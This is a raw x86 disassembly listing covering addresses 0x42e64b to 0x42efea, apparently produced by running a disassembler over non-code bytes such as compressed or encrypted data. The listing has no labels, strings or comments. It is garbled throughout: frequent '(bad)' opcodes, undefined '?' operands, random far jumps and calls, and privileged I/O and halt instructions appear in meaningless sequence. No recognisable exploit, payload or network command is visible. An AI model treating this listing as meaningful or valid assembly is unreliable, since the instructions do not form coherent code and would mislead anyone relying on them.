  42e64b:	sar    esp,0x2c
  42e64e:	adc    al,0x18
  42e650:	mov    esp,0xb6e305fa
  42e655:	mov    ah,BYTE PTR [eax+0x42]
  42e658:	(bad)  
  42e659:	cmp    ch,BYTE PTR ds:0x1c88e745
  42e65f:	sbb    eax,0x73226ca6
  42e664:	les    esp,FWORD PTR ds:0xc1c57e37
  42e66a:	sub    ah,ch
  42e66c:	inc    ecx
  42e66d:	jg     0x42e68a
  42e66f:	add    esp,DWORD PTR [edx]
  42e671:	jbe    0x42e65e
  42e673:	xor    BYTE PTR [edi],dl
  42e675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e676:	lahf   
  42e677:	jae    0x42e622
  42e679:	mov    al,0xef
  42e67b:	pop    es
  42e67c:	and    DWORD PTR [ebp+0x3f2a3b30],0x15a8af1e
  42e686:	cli    
  42e687:	push   0x25
  42e689:	and    eax,0x44ad0573
  42e68e:	add    al,0x58
  42e690:	jo     0x42e69b
  42e692:	clc    
  42e693:	imul   eax,ebp,0x4bc0f433
  42e699:	test   BYTE PTR [eax+0x60],ah
  42e69c:	repz sti 
  42e69e:	(bad)  
  42e69f:	sahf   
  42e6a0:	nop
  42e6a1:	or     dh,ch
  42e6a3:	(bad)  
  42e6a4:	popa   
  42e6a5:	lea    edx,[esi+0x573ad7c6]
  42e6ab:	jns    0x42e66a
  42e6ad:	or     ebp,ebp
  42e6af:	fisubr WORD PTR [esp+ebx*8]
  42e6b2:	je     0x42e6b7
  42e6b4:	inc    esi
  42e6b5:	mov    bh,0xcd
  42e6b7:	push   ds
  42e6b8:	in     al,0x83
  42e6ba:	pop    ss
  42e6bb:	or     DWORD PTR [ecx-0x536ffb4c],esi
  42e6c1:	mov    DWORD PTR [ebp+0x4fb01c0d],edi
  42e6c7:	mov    esi,ebx
  42e6c9:	push   cs
  42e6ca:	jp     0x42e690
  42e6cc:	jle    0x42e70e
  42e6ce:	fldcw  WORD PTR [eax+edx*8+0x62a92348]
  42e6d5:	mov    ebx,0x72bd3a1c
  42e6da:	inc    ebp
  42e6db:	push   esp
  42e6dc:	push   esp
  42e6dd:	test   al,0x44
  42e6df:	jns    0x42e6d9
  42e6e1:	mov    ch,0xe6
  42e6e3:	and    esp,esi
  42e6e5:	xor    BYTE PTR [esi-0x391c6445],ah
  42e6eb:	cwde   
  42e6ec:	or     BYTE PTR [ebx+0x41],al
  42e6ef:	add    DWORD PTR [ebx-0x55],edx
  42e6f2:	inc    esp
  42e6f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e6f4:	dec    esi
  42e6f5:	pop    ebp
  42e6f6:	aam    0x6c
  42e6f8:	mov    esp,DWORD PTR [edi-0x7f]
  42e6fb:	add    BYTE PTR [ecx],ch
  42e6fd:	mov    bh,0xc3
  42e6ff:	inc    esi
  42e700:	arpl   WORD PTR ds:0x5118,bx
  42e705:	xchg   esp,eax
  42e706:	fsub   DWORD PTR [eax-0x5b]
  42e709:	or     DWORD PTR [ebx+0x7c],eax
  42e70c:	loop   0x42e721
  42e70e:	mov    ebx,0x4a18
	...
  42e773:	add    BYTE PTR [edx+0x39],bl
  42e776:	dec    esi
  42e777:	sub    eax,0x7f7b7f6f
  42e77c:	sub    BYTE PTR fs:[esi],cl
  42e77f:	fimul  DWORD PTR [edx]
  42e781:	stos   DWORD PTR es:[edi],eax
  42e782:	sub    eax,0x1f263cd
  42e787:	add    BYTE PTR ds:0x8a000001,al
  42e78d:	dec    edx
  42e78e:	mov    ds:0xa471ce96,eax
  42e793:	mov    bh,0x6
  42e795:	xor    ecx,edi
  42e797:	int3   
  42e798:	dec    edx
  42e799:	mov    fs,WORD PTR [esp+edx*8]
  42e79c:	leave  
  42e79d:	cmp    eax,0x4c33961b
  42e7a2:	xchg   ebp,eax
  42e7a3:	jge    0x42e756
  42e7a5:	adc    esi,ecx
  42e7a7:	or     eax,0x82d0d664
  42e7ac:	icebp  
  42e7ad:	repz (bad) 
  42e7af:	int    0x97
  42e7b1:	fs daa 
  42e7b3:	xor    bl,BYTE PTR [ebp-0x5c]
  42e7b6:	jb     0x42e786
  42e7b8:	mov    al,BYTE PTR [esi-0x6fcfce67]
  42e7be:	js     0x42e795
  42e7c0:	icebp  
  42e7c1:	loope  0x42e778
  42e7c3:	fiadd  WORD PTR [ebx-0x240124a0]
  42e7c9:	push   eax
  42e7ca:	pop    ebx
  42e7cb:	in     eax,dx
  42e7cc:	fcmove st,st(5)
  42e7ce:	pusha  
  42e7cf:	add    cl,BYTE PTR es:[ecx]
  42e7d2:	popf   
  42e7d3:	in     eax,0xbb
  42e7d5:	enter  0xcbc1,0xf
  42e7d9:	(bad)  
  42e7dd:	push   edi
  42e7df:	shl    esp,cl
  42e7e1:	inc    ebp
  42e7e2:	pop    ebp
  42e7e3:	jno    0x42e823
  42e7e5:	icebp  
  42e7e6:	ret    
  42e7e7:	ins    DWORD PTR es:[edi],dx
  42e7e8:	sbb    eax,0xe301cf69
  42e7ed:	sub    BYTE PTR [ecx-0x13f9f1b5],dh
  42e7f3:	sub    DWORD PTR [esi+eiz*8-0x7d],ecx
  42e7f7:	adc    DWORD PTR [edi+ebx*2],esp
  42e7fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e7fb:	test   al,0x18
  42e7fd:	or     BYTE PTR [edx],0xad
  42e800:	pop    ebp
  42e801:	retf   0xc5be
  42e804:	pushf  
  42e805:	mov    bh,0x36
  42e807:	movups xmm0,XMMWORD PTR [eax+0x3e]
  42e80b:	mov    edx,0x645a9985
  42e810:	scas   al,BYTE PTR es:[edi]
  42e811:	pusha  
  42e812:	add    al,0x98
  42e814:	lods   al,BYTE PTR ds:[esi]
  42e815:	loopne 0x42e7aa
  42e817:	cmp    dh,ah
  42e819:	loopne 0x42e7f7
  42e81b:	pushf  
  42e81c:	jl     0x42e879
  42e81e:	or     BYTE PTR [edi],0x89
  42e821:	shl    DWORD PTR [esi+0x77d2780e],1
  42e827:	into   
  42e828:	sub    ah,BYTE PTR [ebx-0x7f99d0a4]
  42e82e:	frstor [ecx]
  42e830:	jg     0x42e818
  42e832:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e833:	push   edi
  42e834:	(bad)  
  42e835:	jle    0x42e7e6
  42e837:	push   edx
  42e838:	fcom   DWORD PTR [edi+edx*8+0x6717ac92]
  42e83f:	pop    esi
  42e840:	mov    ?,WORD PTR [ebx-0x80]
  42e843:	out    dx,al
  42e844:	inc    ebp
  42e845:	sub    ah,BYTE PTR fs:[ebx+0x6397db43]
  42e84c:	sbb    eax,0x8153327c
  42e851:	and    BYTE PTR [ebx],0x68
  42e854:	test   al,0x49
  42e856:	mov    al,bh
  42e858:	push   ebp
  42e859:	xchg   ebx,eax
  42e85a:	aas    
  42e85b:	mov    esp,0xb4f2f096
  42e860:	scas   al,BYTE PTR es:[edi]
  42e861:	or     ah,BYTE PTR [ecx]
  42e863:	or     BYTE PTR [ebp+0x58495084],cl
  42e869:	jecxz  0x42e8c8
  42e86b:	push   edi
  42e86c:	in     al,dx
  42e86d:	imul   ecx,DWORD PTR [ebp-0x19ae86c5],0xc9fcaadf
  42e877:	cdq    
  42e878:	pop    edi
  42e879:	dec    ebp
  42e87a:	push   ebx
  42e87b:	ss mov bl,0xbb
  42e87e:	xchg   ebp,eax
  42e87f:	cmp    al,0x18
  42e881:	fwait
  42e882:	xchg   BYTE PTR [eax],ch
  42e884:	jge    0x42e85b
  42e886:	retf   
  42e887:	cmp    bh,BYTE PTR [ebx-0x54]
  42e88a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e88b:	sbb    BYTE PTR gs:[ebx],0xca
  42e88f:	in     al,0x66
	...
  42e8f1:	add    BYTE PTR [eax],al
  42e8f3:	add    bl,al
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx-0x7dc07d5]
  42e901:	inc    ecx
  42e902:	int3   
  42e903:	jmp    0x105:0x1f368
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	or     al,BYTE PTR [esi+0x3a875485]
  42e912:	jge    0x42e95c
  42e914:	fild   DWORD PTR ss:[esi+0x17]
  42e918:	(bad)  
  42e919:	(bad)  
  42e91b:	push   ss
  42e91c:	call   0x59e79115
  42e921:	ror    DWORD PTR [edi],1
  42e923:	adc    eax,0x1e42c201
  42e928:	mov    ch,0xa7
  42e92a:	add    eax,0x96560b97
  42e92f:	int3   
  42e930:	and    edx,DWORD PTR [eax+0x1f]
  42e933:	hlt    
  42e934:	push   ebp
  42e935:	fcom   DWORD PTR [edi-0x16]
  42e938:	in     al,dx
  42e939:	pop    edi
  42e93a:	std    
  42e93b:	sbb    DWORD PTR [eax],ecx
  42e93d:	mov    al,ds:0xabc030
  42e942:	test   al,0x71
  42e944:	imul   DWORD PTR [edx+eiz*8-0x34]
  42e948:	stos   DWORD PTR es:[edi],eax
  42e949:	(bad)  [ebx]
  42e94b:	xchg   esp,eax
  42e94c:	adc    ebp,DWORD PTR [ebp-0x3a]
  42e94f:	out    0x3a,eax
  42e951:	lods   al,BYTE PTR ds:[esi]
  42e952:	adc    eax,0x39878210
  42e957:	cmp    al,0x6f
  42e959:	and    eax,0x799ce1e
  42e95e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e95f:	mov    ?,ebp
  42e961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e962:	pop    DWORD PTR ds:0xc0bc0cd7
  42e968:	in     eax,dx
  42e969:	or     ebx,ecx
  42e96b:	xchg   esi,eax
  42e96c:	sbb    ebp,DWORD PTR [ebx+0x1c4fea93]
  42e972:	in     al,dx
  42e973:	mov    bl,0x43
  42e975:	mov    edi,0x38f60e0a
  42e97a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e97b:	and    al,0xe3
  42e97d:	cwde   
  42e97e:	pop    ss
  42e97f:	jae    0x42e91c
  42e981:	bound  ecx,QWORD PTR [ebx]
  42e983:	adc    al,0xcc
  42e985:	call   0xa1370a58
  42e98a:	and    al,ch
  42e98c:	sbb    eax,0xf9d7171e
  42e991:	ins    DWORD PTR es:[edi],dx
  42e992:	(bad)  
  42e993:	stos   BYTE PTR es:[edi],al
  42e994:	and    BYTE PTR [esi-0x62],0x82
  42e998:	pop    edx
  42e999:	lock mov ah,0xc8
  42e99c:	push   ds
  42e99d:	jae    0x42e966
  42e99f:	test   BYTE PTR [ecx-0x29],al
  42e9a2:	lds    ebx,FWORD PTR [edi+0x22]
  42e9a5:	pop    es
  42e9a6:	mov    ah,0x4c
  42e9a8:	sahf   
  42e9a9:	out    dx,al
  42e9aa:	idiv   DWORD PTR [esi]
  42e9ac:	pop    edi
  42e9ad:	rcl    BYTE PTR [edi],cl
  42e9af:	mov    ?,ecx
  42e9b1:	lods   eax,DWORD PTR ds:[esi]
  42e9b2:	mov    cl,0x1c
  42e9b4:	fdivr  QWORD PTR cs:[ebx+0x29]
  42e9b8:	cmp    BYTE PTR [esi-0xc],dl
  42e9bb:	out    dx,eax
  42e9bc:	cmp    BYTE PTR gs:[eax+0x0],bh
  42e9c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e9c1:	xchg   ebx,eax
  42e9c2:	inc    ebp
  42e9c3:	mov    bh,0xc7
  42e9c5:	adc    edx,ebx
  42e9c7:	ss add eax,0xfc1ea8cf
  42e9cd:	dec    edx
  42e9ce:	cwde   
  42e9cf:	xchg   ecx,eax
  42e9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e9d1:	inc    ebx
  42e9d2:	fs jne 0x42ea43
  42e9d5:	and    DWORD PTR [esi+0x34e4015a],0xe948b8b1
  42e9df:	push   cs
  42e9e0:	jno    0x42e99f
  42e9e2:	jecxz  0x42e999
  42e9e4:	cmp    eax,0x9014cd00
  42e9e9:	in     eax,dx
  42e9ea:	mov    WORD PTR ss:[eax],fs
  42e9ed:	sbb    eax,0xbce6aa60
  42e9f2:	and    ebx,ecx
  42e9f4:	pop    esi
  42e9f5:	jmp    0x42e9d7
  42e9f7:	sbb    BYTE PTR [edx+0x45],0x59
  42e9fb:	hlt    
  42e9fc:	das    
  42e9fd:	fsub   st(3),st
  42e9ff:	mov    dh,0x71
  42ea01:	add    dh,0x91
  42ea04:	dec    BYTE PTR [eax]
  42ea06:	jecxz  0x42ea06
  42ea08:	imul   edx,DWORD PTR [esi],0x41
  42ea0b:	push   edi
  42ea0c:	cdq    
  42ea0d:	push   es
  42ea0e:	mov    WORD PTR [edi+0x1b],es
	...
  42ea71:	add    BYTE PTR [eax],al
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	mov    dl,0x42
  42ea82:	mov    cl,0x23
  42ea84:	ins    DWORD PTR es:[edi],dx
  42ea85:	hlt    
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0x6000001
  42ea8d:	shr    bh,0x39
  42ea90:	add    cl,cl
  42ea92:	jo     0x42eafb
  42ea94:	enter  0xa82,0xef
  42ea98:	je     0x42eae2
  42ea9a:	gs jne 0x42ea95
  42ea9d:	mov    ebp,0x6f2bb04
  42eaa2:	into   
  42eaa3:	sbb    esp,DWORD PTR [ecx+0x6bba0139]
  42eaa9:	push   edi
  42eaaa:	mov    eax,0xd9872643
  42eaaf:	into   
  42eab0:	jge    0x42ea83
  42eab2:	std    
  42eab3:	mov    esp,0x7dbb8a19
  42eab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eab9:	mov    ebp,0x1a405cb0
  42eabe:	popf   
  42eabf:	and    al,0x3b
  42eac1:	es dec ebp
  42eac3:	in     eax,0xd3
  42eac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eac6:	mov    al,0x65
  42eac8:	jmp    DWORD PTR cs:[ecx-0x35]
  42eacc:	outs   dx,BYTE PTR ds:[esi]
  42eacd:	sub    DWORD PTR [eax+ebp*8+0x5f],edi
  42ead1:	push   cs
  42ead2:	cmc    
  42ead3:	dec    bl
  42ead5:	mov    ah,0xc1
  42ead7:	repz or BYTE PTR [esi-0x2acd3781],dl
  42eade:	mov    ah,0x3a
  42eae0:	std    
  42eae1:	rcl    DWORD PTR [ebp+0x14943b1d],cl
  42eae7:	out    dx,al
  42eae8:	pop    ebp
  42eae9:	push   edx
  42eaea:	test   BYTE PTR ds:0x89435bda,cl
  42eaf0:	out    0xc1,eax
  42eaf2:	or     al,0x2c
  42eaf4:	sub    esp,DWORD PTR [edx]
  42eaf6:	adc    DWORD PTR [ebx-0x7eb7d548],0xd63ca555
  42eb00:	(bad)  
  42eb01:	pop    esi
  42eb02:	fmul   st,st(1)
  42eb04:	pushf  
  42eb05:	nop
  42eb06:	jnp    0x42eb17
  42eb08:	adc    DWORD PTR [ecx-0x727faf35],0xffffff90
  42eb0f:	pusha  
  42eb10:	xchg   BYTE PTR [edx-0x64],bh
  42eb13:	test   BYTE PTR [esi],0x1b
  42eb16:	mov    ?,WORD PTR [ebp+0x20]
  42eb19:	aaa    
  42eb1a:	push   esi
  42eb1b:	adc    al,0x4c
  42eb1d:	pushf  
  42eb1e:	lea    ecx,[ecx]
  42eb20:	repnz fistp DWORD PTR [esi-0x66]
  42eb24:	cmp    al,0x6b
  42eb26:	sbb    edx,ebx
  42eb28:	adc    ecx,0x37b6324d
  42eb2e:	add    eax,0xf28d6aca
  42eb33:	push   ds
  42eb34:	(bad)  
  42eb35:	xlat   BYTE PTR ds:[ebx]
  42eb36:	ja     0x42eb9b
  42eb38:	xor    al,0xc4
  42eb3a:	in     al,0x67
  42eb3c:	das    
  42eb3d:	cmp    BYTE PTR [esi],al
  42eb3f:	jmp    0x8410:0x91b9683f
  42eb46:	jo     0x42eb74
  42eb48:	add    eax,0xce1e4da5
  42eb4d:	jmp    0x7002:0x84eaadc1
  42eb54:	adc    al,0x5a
  42eb56:	xor    ebx,DWORD PTR [esi]
  42eb58:	fnstsw WORD PTR [edi]
  42eb5a:	xor    al,0xaa
  42eb5c:	and    esp,DWORD PTR [ebx]
  42eb5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb5f:	sbb    eax,0x30494b2e
  42eb64:	test   BYTE PTR [ebp-0x69],0xcd
  42eb68:	mov    ah,0x49
  42eb6a:	add    BYTE PTR [edi-0x77],ah
  42eb6d:	pop    ecx
  42eb6e:	clc    
  42eb6f:	push   ebx
  42eb70:	sub    ah,BYTE PTR [edi+0xe822624]
  42eb76:	adc    DWORD PTR [ebp+eax*4+0x28c3f1d1],ebx
  42eb7d:	cmp    edx,DWORD PTR [ebx+0x66]
  42eb80:	ror    DWORD PTR [esi],1
  42eb82:	cs pop edx
  42eb84:	rcr    BYTE PTR [ebp-0x51622111],cl
  42eb8a:	scas   eax,DWORD PTR es:[edi]
  42eb8b:	cmp    al,0xdf
  42eb8d:	es ja  0x42eb98
  42eb90:	pushf  
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	adc    ecx,0x7297ab30
  42ec05:	cmc    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    eax,0x54000001
  42ec0d:	data16 fimul DWORD PTR [ecx]
  42ec10:	daa    
  42ec11:	xor    al,0xb2
  42ec13:	mov    edi,0xa35dfa58
  42ec18:	(bad)  
  42ec19:	jecxz  0x42ec83
  42ec1b:	hlt    
  42ec1c:	dec    ebx
  42ec1d:	fisubr DWORD PTR [esi-0x1634ff8]
  42ec23:	mov    bl,0x7b
  42ec25:	add    al,0xb0
  42ec27:	psubw  mm1,QWORD PTR [ecx+0x77]
  42ec2b:	push   ecx
  42ec2c:	pop    edi
  42ec2d:	adc    al,0xb0
  42ec2f:	fstp   DWORD PTR [ebp+0x57]
  42ec32:	or     DWORD PTR [esi+ebx*2+0x222aeaee],esi
  42ec39:	cmp    ebx,eax
  42ec3b:	mov    cl,0xdd
  42ec3d:	push   es
  42ec3e:	retf   
  42ec3f:	rcl    BYTE PTR [eax+0x1b],cl
  42ec42:	xor    esi,edi
  42ec44:	adc    eax,0xb9bb8137
  42ec49:	fidivr WORD PTR [ebx]
  42ec4b:	(bad)  
  42ec4c:	retf   0x7479
  42ec4f:	sub    ah,BYTE PTR [edi]
  42ec51:	mov    dl,0x6b
  42ec53:	hlt    
  42ec54:	ret    
  42ec55:	aas    
  42ec56:	push   ebp
  42ec57:	shl    BYTE PTR [ecx+0x76f52d],cl
  42ec5d:	je     0x42ec60
  42ec5f:	stc    
  42ec60:	shr    BYTE PTR [ebx+ebx*4+0x26c141ee],0xbc
  42ec68:	xor    eax,0xbb693455
  42ec6d:	jp     0x42ece3
  42ec6f:	dec    edx
  42ec70:	cmp    edi,DWORD PTR [edi]
  42ec72:	sbb    al,BYTE PTR [bp+di-0x72d8]
  42ec77:	fldcw  WORD PTR [ecx+0x50]
  42ec7a:	jb     0x42ec56
  42ec7c:	(bad)  
  42ec7d:	(bad)  [ebp-0x55eace89]
  42ec83:	pop    ebp
  42ec84:	mov    cs,WORD PTR cs:[edx-0x78ddc1e3]
  42ec8b:	test   DWORD PTR [ebx-0x6ab5802],0xb0e0a78b
  42ec95:	sub    DWORD PTR [ecx+0xb846052],esi
  42ec9b:	(bad)  
  42ec9c:	push   edi
  42ec9d:	(bad)  
  42ec9f:	arpl   si,bp
  42eca1:	or     eax,0x55404d70
  42eca6:	adc    al,0x93
  42eca8:	inc    edi
  42eca9:	mov    al,ds:0x67287bd1
  42ecae:	xchg   ebp,eax
  42ecaf:	clc    
  42ecb0:	mov    cl,BYTE PTR [esi+edx*1-0x6e]
  42ecb4:	push   ebx
  42ecb5:	dec    ecx
  42ecb6:	je     0x42ed0b
  42ecb8:	in     eax,0x6b
  42ecba:	push   edx
  42ecbb:	jne    0x42eceb
  42ecbd:	call   0x21ac:0x6011c8f7
  42ecc4:	jmp    0x7444:0xe29eabf1
  42eccb:	or     DWORD PTR [edx-0x6f],0x14ae3e7b
  42ecd2:	or     eax,0x40983ab
  42ecd7:	aaa    
  42ecd8:	dec    ebx
  42ecd9:	inc    ebp
  42ecda:	jbe    0x42ed38
  42ecdc:	cld    
  42ecdd:	call   0xef6f:0x59426d92
  42ece4:	or     al,0x7d
  42ece6:	nop
  42ece7:	mov    ebx,0x33e67931
  42ecec:	mov    ecx,0x89bcd79f
  42ecf1:	std    
  42ecf2:	fnstenv [edi-0x6a]
  42ecf5:	out    dx,eax
  42ecf6:	cmp    al,BYTE PTR [ebp-0x7a]
  42ecf9:	rcr    DWORD PTR [eax],cl
  42ecfb:	mov    ch,0x37
  42ecfd:	xchg   esi,eax
  42ecfe:	stos   DWORD PTR es:[edi],eax
  42ecff:	sbb    DWORD PTR [esi+0x5260e557],esp
  42ed05:	pop    esi
  42ed06:	inc    eax
  42ed07:	ret    
  42ed08:	ss sub al,0xcf
  42ed0b:	scas   al,BYTE PTR es:[edi]
  42ed0c:	push   0xb
  42ed0e:	mov    ds:0x8cb0,al
	...
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp-0x2455375e]
  42ed83:	dec    ecx
  42ed84:	ja     0x42ed7c
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0xcd000001
  42ed8d:	mov    eax,0x4e67dacd
  42ed92:	retf   0xb9c6
  42ed95:	mov    bl,0x17
  42ed97:	loope  0x42edd2
  42ed99:	jmp    0x42edbc
  42ed9b:	pushf  
  42ed9c:	sub    esi,DWORD PTR [edi-0x72]
  42ed9f:	or     edx,DWORD PTR [ebx+0x1e]
  42eda2:	(bad)
  42eda6:	adc    BYTE PTR [edi+edx*2-0x2b],cl
  42edaa:	dec    esp
  42edab:	jne    0x42edc4
  42edad:	jg     0x42edfa
  42edaf:	sub    ch,0x3f
  42edb2:	jae    0x42edf6
  42edb4:	cmp    DWORD PTR [edx],ebx
  42edb6:	dec    edi
  42edb7:	xchg   BYTE PTR [ebp+0x603a6ace],dh
  42edbd:	ins    BYTE PTR es:[edi],dx
  42edbe:	sub    al,0x45
  42edc0:	pop    esp
  42edc1:	cmp    eax,0xe2693905
  42edc6:	es mov esi,0x1d251893
  42edcc:	stos   DWORD PTR es:[edi],eax
  42edcd:	add    bl,al
  42edcf:	dec    eax
  42edd0:	or     DWORD PTR [edx+edx*8],edx
  42edd3:	and    dh,BYTE PTR [edi+0x10]
  42edd6:	add    DWORD PTR [ebx],esp
  42edd8:	push   esp
  42edd9:	into   
  42edda:	sub    dl,BYTE PTR [ebx+0xb]
  42eddd:	(bad)  
  42edde:	cmp    ah,BYTE PTR [eax-0x491140ee]
  42ede4:	fcomp  st(7)
  42ede6:	mov    ecx,0x3fd31b2a
  42edeb:	in     eax,dx
  42edec:	hlt    
  42eded:	das    
  42edee:	outs   dx,BYTE PTR ds:[esi]
  42edef:	cmp    eax,0x923d5fb
  42edf4:	or     BYTE PTR [edx-0x73],bh
  42edf7:	call   0xb7f24bf
  42edfc:	int    0x33
  42edfe:	mov    eax,0x9b7032e5
  42ee03:	aam    0xcf
  42ee05:	call   0xdcdb:0xb39ff114
  42ee0c:	je     0x42ee01
  42ee0e:	inc    edx
  42ee0f:	js     0x42ee79
  42ee11:	aad    0xa5
  42ee13:	xor    al,0x3f
  42ee15:	dec    edi
  42ee16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee17:	lock inc eax
  42ee19:	mov    es,WORD PTR [eax]
  42ee1b:	stc    
  42ee1c:	out    dx,eax
  42ee1d:	xor    edi,ebp
  42ee1f:	(bad)  
  42ee20:	scas   al,BYTE PTR es:[edi]
  42ee21:	mov    al,0x39
  42ee23:	push   ss
  42ee24:	or     DWORD PTR [ebx+eiz*4+0x99ab5fe],edx
  42ee2b:	dec    edi
  42ee2c:	sahf   
  42ee2d:	retf   
  42ee2e:	dec    esp
  42ee2f:	sub    cl,BYTE PTR [ebp+0x2a]
  42ee32:	imul   esi,DWORD PTR [eax+eiz*1+0x43],0x7e
  42ee37:	in     eax,dx
  42ee38:	xchg   esi,eax
  42ee39:	test   al,0xee
  42ee3b:	(bad)  
  42ee3c:	sbb    ebx,DWORD PTR [edi+esi*2]
  42ee3f:	xchg   edx,eax
  42ee40:	adc    bl,al
  42ee42:	cli    
  42ee43:	xor    DWORD PTR [ebp+0x7c5a194b],edx
  42ee49:	mov    dl,0xba
  42ee4b:	ins    BYTE PTR es:[edi],dx
  42ee4c:	xor    DWORD PTR [esi-0x79],eax
  42ee4f:	rol    DWORD PTR [esi],0xa4
  42ee52:	mov    ch,0x91
  42ee54:	(bad)  
  42ee55:	call   0x6095b691
  42ee5a:	pop    edx
  42ee5b:	mov    dl,0x48
  42ee5d:	lods   al,BYTE PTR ds:[esi]
  42ee5e:	mov    bl,0x4b
  42ee60:	dec    eax
  42ee61:	sbb    bl,bl
  42ee63:	jbe    0x42eeb5
  42ee65:	shl    BYTE PTR [esi-0x59596809],cl
  42ee6b:	push   es
  42ee6c:	hlt    
  42ee6d:	xchg   edx,eax
  42ee6e:	outs   dx,DWORD PTR ds:[esi]
  42ee6f:	cmc    
  42ee70:	jbe    0x42edf2
  42ee72:	cld    
  42ee73:	mov    ds:0x9c7505bc,eax
  42ee78:	cs sub al,0x9f
  42ee7b:	call   0x83aaac65
  42ee80:	add    esp,ebx
  42ee82:	xchg   BYTE PTR [edi-0x40],bh
  42ee85:	lock test DWORD PTR [ecx+esi*1-0x61716803],0xb284dcee
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	dec    ecx
  42ef01:	cdq    
  42ef02:	fs mov dh,0x7c
  42ef05:	test   DWORD PTR [ecx],0x10500
  42ef0b:	add    BYTE PTR [ebp+0x4f4078c4],dl
  42ef11:	cli    
  42ef12:	xchg   edx,eax
  42ef13:	mov    WORD PTR [esi-0x4dd66bee],es
  42ef19:	push   esp
  42ef1a:	cmp    al,0xb6
  42ef1c:	outs   dx,DWORD PTR ds:[esi]
  42ef1d:	and    edx,DWORD PTR [ebp+0x71a265b8]
  42ef23:	mov    ebp,0x48fb90e6
  42ef28:	jle    0x42ef36
  42ef2a:	dec    ecx
  42ef2b:	xchg   al,ah
  42ef2d:	call   0xee745535
  42ef32:	ds dec esp
  42ef34:	pop    ecx
  42ef35:	cmp    eax,0x43dff0b
  42ef3a:	lock dec esp
  42ef3c:	lds    ebp,FWORD PTR [ecx]
  42ef3e:	dec    ebp
  42ef3f:	jg     0x42ef96
  42ef41:	ret    
  42ef42:	pusha  
  42ef43:	jle    0x42ef53
  42ef45:	imul   ebx,DWORD PTR [edi],0x4e784e0
  42ef4b:	cmp    eax,0x5c0b8216
  42ef50:	aaa    
  42ef51:	mov    ah,0x5d
  42ef53:	dec    ebx
  42ef54:	ja     0x42ef95
  42ef56:	mov    dh,BYTE PTR [ecx+0x6a]
  42ef59:	add    eax,0xd66c9599
  42ef5e:	inc    esi
  42ef5f:	or     eax,0x2e5acf86
  42ef64:	idiv   DWORD PTR [ebx]
  42ef66:	adc    dl,0x66
  42ef69:	cli    
  42ef6a:	pop    ds
  42ef6b:	mov    dh,0xa0
  42ef6d:	or     al,BYTE PTR [esi-0x7cefabe2]
  42ef73:	mov    eax,0x9c3b4fac
  42ef78:	mov    DWORD PTR [eax+0xa],ebp
  42ef7b:	jbe    0x42efdf
  42ef7d:	inc    ecx
  42ef7e:	stos   BYTE PTR es:[edi],al
  42ef7f:	lahf   
  42ef80:	sbb    BYTE PTR [ecx],ch
  42ef82:	paddb  mm7,QWORD PTR [ebp+0x56ff59aa]
  42ef89:	xchg   BYTE PTR [esi],bh
  42ef8b:	ret    0x1896
  42ef8e:	xlat   BYTE PTR ds:[ebx]
  42ef8f:	fild   DWORD PTR [edx]
  42ef91:	popa   
  42ef92:	shr    DWORD PTR [edx+0x60],1
  42ef95:	ss mov edi,0x41b42115
  42ef9b:	(bad)  
  42ef9c:	ds call 0x6192:0xc98f70db
  42efa4:	sahf   
  42efa5:	push   edx
  42efa6:	in     al,0xfd
  42efa8:	aam    0x1d
  42efaa:	sub    al,0x20
  42efac:	pop    es
  42efad:	jb     0x42efe6
  42efaf:	stos   BYTE PTR es:[edi],al
  42efb0:	add    cl,BYTE PTR [ecx]
  42efb2:	in     eax,0x71
  42efb4:	js     0x42efc8
  42efb6:	sub    dl,dh
  42efb8:	not    BYTE PTR [edi+0x75]
  42efbb:	cmp    dl,BYTE PTR [ecx+ebp*8-0x303ab5a]
  42efc2:	and    BYTE PTR [esi+0x5930e9e9],dh
  42efc8:	dec    edx
  42efc9:	mov    eax,ds:0xc71983a2
  42efce:	sti    
  42efcf:	dec    esp
  42efd0:	xchg   esp,eax
  42efd1:	out    0xd9,eax
  42efd3:	scas   al,BYTE PTR es:[edi]
  42efd4:	push   esi
  42efd5:	lahf   
  42efd6:	loope  0x42efa7
  42efd8:	inc    ebp
  42efd9:	xchg   ecx,eax
  42efda:	leave  
  42efdb:	frstor [ecx+0x7f0e9ecc]
  42efe1:	pop    ebp
  42efe2:	(bad)  
  42efe3:	clc    
  42efe4:	repz xor BYTE PTR [eax-0x1],bl
  42efe8:	pop    edi
  42efe9:	cli    
  42efea:	retf   
